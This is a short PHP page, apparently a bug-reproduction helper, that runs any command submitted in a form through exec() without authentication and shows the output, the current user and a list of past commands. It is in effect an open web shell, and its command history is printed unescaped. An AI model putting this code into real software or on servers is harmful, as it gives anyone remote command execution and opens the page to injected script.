<?php

session_start();

if (!isset($_SESSION['last_cmds'])) {
    $_SESSION['last_cmds'] = [];
}

echo 'Hello Reproducer!!';

if (isset($_POST['cmd'])) {
    $output = [];
    array_unshift($_SESSION['last_cmds'], $trim = trim($_POST['cmd']));
    exec($trim, $output);
    echo '<pre>';
    foreach ($output as $line) {
        echo $line.PHP_EOL;
    }
    echo '</pre>';
}

?>
<hr>
<strong><?= exec('whoami') ?></strong>
<form action="/" method="post">
    <textarea id="cmd" name="cmd"></textarea>
    <button type="submit">exec</button>
</form>

<br>
<strong>Last commands:</strong>
<ul>
    <?php foreach ($_SESSION['last_cmds'] as $i => $cmd) { ?>
        <li>
            <a href="#" id="cmd<?= $i ?>" onclick="document.getElementById('cmd').innerHTML = document.getElementById('cmd<?= $i ?>').innerHTML"><?= $cmd ?></a>
        </li>
    <?php } ?>
</ul>
